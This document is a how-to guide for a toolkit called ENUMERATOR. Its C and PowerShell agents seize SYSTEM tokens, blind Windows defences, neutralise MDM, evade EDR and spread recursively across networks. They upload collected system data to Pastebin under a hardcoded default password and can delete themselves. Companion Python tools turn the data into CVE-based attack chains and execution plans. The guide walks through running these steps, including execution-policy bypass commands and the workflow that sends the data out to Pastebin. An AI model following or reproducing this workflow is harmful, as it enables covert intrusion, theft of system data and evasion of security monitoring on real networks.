# How to Use ENUMERATOR

A comprehensive step-by-step guide for using the Windows System Enumerator tool suite.

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Initial Setup](#initial-setup)
3. [Running Enumerators](#running-enumerators)
4. [Processing Enumeration Data](#processing-enumeration-data)
5. [Generating Attack Chains](#generating-attack-chains)
6. [Using Interactive Interfaces](#using-interactive-interfaces)
7. [Complete Workflow Examples](#complete-workflow-examples)
8. [Troubleshooting](#troubleshooting)

## Prerequisites

### For Windows Enumerators

**C Enumerator:**
- Windows 10 (Windows 7 supported with `Makefile.win7`)
- MinGW or MSVC compiler
- Windows SDK
- Administrator privileges

**PowerShell Enumerator:**
- Windows 10
- PowerShell 5.1+ or PowerShell Core 7+
- Administrator privileges
- Network access (for Pastebin upload)

### For Processor Tools

**Parser:**
- Linux, macOS, or Windows (with WSL)
- Python 3.8 or higher
- pip package manager
- Network access (for downloading Pastebin data)

**Chain Compiler:**
- Debian Linux (Debian 11/12 tested)
- Python 3.8 or higher
- pip package manager

## Initial Setup

### Step 1: Clone/Download Repository

```bash
cd /path/to/DSMILSystem/tools/ENUMERATOR
```

### Step 2: Build/Setup Components

#### Option A: Build Everything at Once

```bash
# Make scripts executable (if needed)
chmod +x *.sh

# Build/setup all components
./build_all.sh
```

#### Option B: Build Components Individually

**Build C Enumerator (Windows/MinGW):**
```bash
# Linux/Windows (MSYS2/MinGW)
./build_c_enumerator.sh

# Windows (Batch)
build_c_enumerator.bat
```

**Setup Processor Parser:**
```bash
./setup_parser.sh
```

**Setup Chain Compiler (Debian only):**
```bash
./setup_chain_compiler.sh
```

### Step 3: Verify Setup

**Verify C Enumerator:**
```bash
cd c_enumerator
ls -la enumerator.exe  # Should exist after build
```

**Verify Parser:**
```bash
cd processor/parser
source venv/bin/activate  # If using venv
python3 parser.py --help
```

**Verify Chain Compiler:**
```bash
cd processor/debian_chain_compiler
source venv/bin/activate  # If using venv
python3 chain_compiler.py --help
```

## Running Enumerators

### Using C Enumerator

#### Step 1: Build (if not already built)

```bash
cd c_enumerator
make
# Or use: ../build_c_enumerator.sh
```

#### Step 2: Run on Windows Target

```cmd
# Navigate to enumerator directory
cd c_enumerator

# Run enumerator (requires Administrator privileges)
enumerator.exe
```

#### Step 3: Monitor Progress

The enumerator will display a progress bar showing:
- SYSTEM token acquisition
- Defensive feature blinding
- MDM detection and neutralization
- EDR detection and evasion
- System enumeration
- Network enumeration
- Recursive network discovery
- Pastebin upload

#### Step 4: Capture Output

After completion, the enumerator will display:
```
[+] Enumeration complete!
[+] Pastebin URL: https://pastebin.com/XXXXX
[+] Password: ducknipples
[?] Delete enumerator.exe? (y/n):
```

**Important:** Copy the Pastebin URL and password before confirming deletion.

### Using PowerShell Enumerator

#### Step 1: Navigate to Directory

```powershell
cd powershell_enumerator
```

#### Step 2: Run Enumerator

**Basic Usage:**
```powershell
# Run with default settings
.\enumerator.ps1
```

**Advanced Options:**
```powershell
# Custom Pastebin password
.\enumerator.ps1 -PastebinPassword "mypassword123"

# Custom recursion depth (default: 3)
.\enumerator.ps1 -MaxDepth 5

# Skip MDM neutralization
.\enumerator.ps1 -SkipMDM

# Skip EDR evasion
.\enumerator.ps1 -SkipEDR

# Combine options
.\enumerator.ps1 -PastebinPassword "secure123" -MaxDepth 4
```

#### Step 3: Handle Execution Policy (if needed)

If you encounter execution policy errors:

```powershell
# Temporarily bypass (current session only)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

# Or run with bypass flag
powershell.exe -ExecutionPolicy Bypass -File .\enumerator.ps1
```

#### Step 4: Capture Output

Similar to C enumerator, PowerShell version will display:
- Progress information
- Pastebin URL
- Password
- Self-deletion prompt

## Processing Enumeration Data

### Step 1: Setup Parser (First Time Only)

```bash
cd processor/parser
./../../setup_parser.sh
# Or manually:
# python3 -m venv venv
# source venv/bin/activate
# pip install -r requirements.txt
```

### Step 2: Download and Parse Data

**From Pastebin URL:**
```bash
cd processor/parser

# Activate virtual environment (if using venv)
source venv/bin/activate

# Parse from Pastebin
python3 parser.py https://pastebin.com/XXXXX --password ducknipples
```

**From Local File:**
```bash
# If you saved enumeration data locally
python3 parser.py --file enumeration_data.txt
```

### Step 3: Review Generated Outputs

After parsing, check the `output/` directory:

```bash
cd processor/parser/output

# View parsed data
cat parsed_data.json

# View documentation
cat docs/system_report.md

# View CVE report
cat reports/cve_report.md

# View MITRE ATT&CK report
cat reports/mitre_techniques.md

# View network topology (HTML)
open diagrams/network_topology.html
```

### Step 4: Generate Additional Visualizations

**Generate VLAN Diagram:**
```python
from vlan_diagram import VLANDiagramGenerator
import json

with open('output/parsed_data.json', 'r') as f:
    data = json.load(f)

vlan_gen = VLANDiagramGenerator()
vlan_gen.generate(data, ["mermaid", "html"])
```

**Generate Network Topology:**
```python
from topology_builder import TopologyBuilder
import json

with open('output/parsed_data.json', 'r') as f:
    data = json.load(f)

topo_builder = TopologyBuilder()
topo_builder.build(data, output_formats=["mermaid", "html"])
```

## Generating Attack Chains

### Step 1: Setup Chain Compiler (Debian Only)

```bash
cd processor/debian_chain_compiler
./../../setup_chain_compiler.sh
# Or manually:
# ./install.sh
```

**Verify Debian System:**
```bash
# Check OS
cat /etc/os-release | grep -i debian
# Should show Debian version
```

### Step 2: Compile Attack Chains

```bash
cd processor/debian_chain_compiler

# Activate virtual environment (if using venv)
source venv/bin/activate

# Basic compilation
python3 chain_compiler.py ../parser/output/parsed_data.json

# Specify output file
python3 chain_compiler.py ../parser/output/parsed_data.json -o compiled_chains.json

# Export as Markdown
python3 chain_compiler.py ../parser/output/parsed_data.json -f markdown -o chains.md
```

### Step 3: Generate Execution Plan

```bash
# Generate detailed execution plan for specific chain
python3 chain_compiler.py ../parser/output/parsed_data.json --chain-id cve_chain_1

# List all available chains
python3 chain_compiler.py ../parser/output/parsed_data.json --list-chains
```

### Step 4: Review Compiled Chains

```bash
# View compiled chains (JSON)
cat compiled_chains.json | jq '.chains[] | {chain_id, name, risk_level, success_probability}'

# View Markdown report
cat chains.md
```

## Using Interactive Interfaces

### TUI Interface (Text-Based)

```bash
cd processor/parser

# Activate virtual environment
source venv/bin/activate

# Launch TUI browser
python3 chain_browser_tui.py output/parsed_data.json
```

**TUI Controls:**
- Arrow keys: Navigate
- Enter: Select/Expand
- Q: Quit
- Tab: Switch panels

### Web Interface

```bash
cd processor/parser

# Activate virtual environment
source venv/bin/activate

# Start web server
python3 web_interface/app.py
```

**Access Web Interface:**
- Open browser to: `http://localhost:5000`
- Navigate attack chains interactively
- View network topology visualizations

### Chain Explorer (Graph-Based)

```bash
cd processor/parser

# Activate virtual environment
source venv/bin/activate

# Launch graph explorer
python3 chain_explorer.py output/parsed_data.json
```

**Explorer Features:**
- Graph-based chain visualization
- Interactive node exploration
- Path analysis
- Export capabilities

## Complete Workflow Examples

### Example 1: Basic Enumeration and Analysis

**Windows Side:**
```cmd
# Build C enumerator
cd c_enumerator
make

# Run enumerator
enumerator.exe

# Copy Pastebin URL: https://pastebin.com/abc123
# Password: ducknipples
```

**Linux Side:**
```bash
# Setup parser (first time)
cd tools/ENUMERATOR
./setup_parser.sh

# Parse enumeration data
cd processor/parser
source venv/bin/activate
python3 parser.py https://pastebin.com/abc123 --password ducknipples

# Review outputs
ls -la output/
cat output/reports/cve_report.md
```

### Example 2: Full Workflow with Attack Chains

**Windows Side:**
```powershell
# Run PowerShell enumerator with custom settings
cd powershell_enumerator
.\enumerator.ps1 -PastebinPassword "secure123" -MaxDepth 4

# Copy URL: https://pastebin.com/xyz789
```

**Linux Side:**
```bash
# Parse data
cd tools/ENUMERATOR/processor/parser
source venv/bin/activate
python3 parser.py https://pastebin.com/xyz789 --password secure123

# Compile attack chains (Debian)
cd ../debian_chain_compiler
source venv/bin/activate
python3 chain_compiler.py ../parser/output/parsed_data.json -o chains.json

# Generate execution plan
python3 chain_compiler.py ../parser/output/parsed_data.json --chain-id cve_chain_1

# Browse chains interactively
cd ../parser
python3 chain_browser_tui.py output/parsed_data.json
```

### Example 3: Network-Wide Analysis

**Multiple Windows Targets:**
```cmd
# Run enumerator on multiple systems
# System 1: https://pastebin.com/url1 (password: ducknipples)
# System 2: https://pastebin.com/url2 (password: ducknipples)
# System 3: https://pastebin.com/url3 (password: ducknipples)
```

**Linux Analysis:**
```bash
# Parse each enumeration
cd processor/parser
source venv/bin/activate

python3 parser.py https://pastebin.com/url1 --password ducknipples
python3 parser.py https://pastebin.com/url2 --password ducknipples
python3 parser.py https://pastebin.com/url3 --password ducknipples

# Generate network-wide CVE correlation
python3 network_cve_correlator.py output/parsed_data.json

# Build network topology
python3 topology_builder.py output/parsed_data.json --network-wide
```

## Troubleshooting

### C Enumerator Build Issues

**Problem: "No compiler found"**
```bash
# Install MinGW (Windows)
# Or install MinGW-w64 (Linux cross-compile)
sudo apt-get install gcc-mingw-w64-x86-64

# Verify installation
gcc --version
# Or
x86_64-w64-mingw32-gcc --version
```

**Problem: "Missing libraries"**
```bash
# Check Makefile for required libraries
# Install missing Windows SDK components
# Or use MSVC with proper SDK installation
```

**Problem: "Build succeeds but executable doesn't run"**
```bash
# Check Windows version compatibility
# Try Windows 7 build: make -f Makefile.win7
# Check for missing DLL dependencies
```

### PowerShell Enumerator Issues

**Problem: "Execution policy error"**
```powershell
# Solution 1: Bypass for current session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

# Solution 2: Run with bypass flag
powershell.exe -ExecutionPolicy Bypass -File .\enumerator.ps1

# Solution 3: Change execution policy (requires admin)
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

**Problem: "Access denied" or "Permission denied"**
```powershell
# Run PowerShell as Administrator
# Right-click PowerShell → Run as Administrator
# Then run enumerator
```

**Problem: "Pastebin upload fails"**
```powershell
# Check network connectivity
Test-NetConnection pastebin.com -Port 443

# Try with custom password
.\enumerator.ps1 -PastebinPassword "test123"

# Check firewall settings
```

### Parser Issues

**Problem: "Python not found"**
```bash
# Install Python 3.8+
sudo apt-get install python3 python3-pip

# Or on macOS
brew install python3

# Verify installation
python3 --version
```

**Problem: "Module not found" errors**
```bash
# Reinstall dependencies
cd processor/parser
pip install -r requirements.txt --upgrade

# Or recreate virtual environment
rm -rf venv
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**Problem: "Pastebin download fails"**
```bash
# Check network connectivity
ping pastebin.com

# Verify URL and password
# Try downloading manually to verify

# Check if Pastebin requires CAPTCHA
# Some Pastebin links expire or require authentication
```

**Problem: "JSON parsing errors"**
```bash
# Verify input file format
cat enumeration_data.txt | head -20

# Check if data is corrupted
# Try re-downloading from Pastebin

# Validate JSON structure
python3 -m json.tool parsed_data.json
```

### Chain Compiler Issues

**Problem: "This tool only runs on Debian Linux"**
```bash
# Verify OS
cat /etc/os-release

# Chain compiler requires Debian
# Use parser on other systems, compile chains on Debian
```

**Problem: "Parser directory not found"**
```bash
# Ensure you're in the correct directory
cd processor/debian_chain_compiler

# Check relative path to parser
ls ../parser/parser.py

# Adjust path if needed
python3 chain_compiler.py /full/path/to/parsed_data.json
```

**Problem: "No chains generated"**
```bash
# Check if parsed_data.json contains attack chain data
cat ../parser/output/parsed_data.json | grep -i "attack_chains"

# Ensure parser generated chain data
# Re-run parser if needed

# Check chain compiler logs for errors
python3 chain_compiler.py ../parser/output/parsed_data.json -v
```

### General Issues

**Problem: "Permission denied" on scripts**
```bash
# Make scripts executable
chmod +x *.sh
chmod +x processor/*/*.sh
```

**Problem: "Virtual environment not activating"**
```bash
# Use full path
source /full/path/to/venv/bin/activate

# Or recreate venv
rm -rf venv
python3 -m venv venv
source venv/bin/activate
```

**Problem: "Network enumeration fails"**
```bash
# Check network permissions
# Ensure enumerator has network access
# Check firewall rules
# Verify target systems are reachable
```

## Best Practices

### Security

1. **Use Strong Passwords**: Change default Pastebin password
2. **Secure Storage**: Store enumeration data securely
3. **Clean Up**: Delete enumeration data after analysis
4. **Network Isolation**: Run enumerators in isolated networks when testing

### Performance

1. **Recursion Depth**: Limit `-MaxDepth` to avoid excessive network traffic
2. **Parallel Processing**: Process multiple enumerations in parallel
3. **Caching**: Cache CVE data to reduce API calls
4. **Resource Limits**: Monitor system resources during enumeration

### Workflow

1. **Documentation**: Keep notes of Pastebin URLs and passwords
2. **Version Control**: Track enumeration data versions
3. **Backup**: Backup parsed data before chain compilation
4. **Testing**: Test on isolated systems before production use

## Additional Resources

- **C Enumerator Documentation**: `c_enumerator/README.md`
- **PowerShell Enumerator Documentation**: `powershell_enumerator/README.md`
- **Parser Documentation**: `processor/parser/README.md`
- **Chain Compiler Documentation**: `processor/debian_chain_compiler/README.md`
- **Main README**: `README.md`

## Getting Help

If you encounter issues not covered in this guide:

1. Check component-specific README files
2. Review error messages carefully
3. Verify prerequisites and setup
4. Check system logs for additional details
5. Review troubleshooting section above

---

**Last Updated**: See git commit history for latest changes.
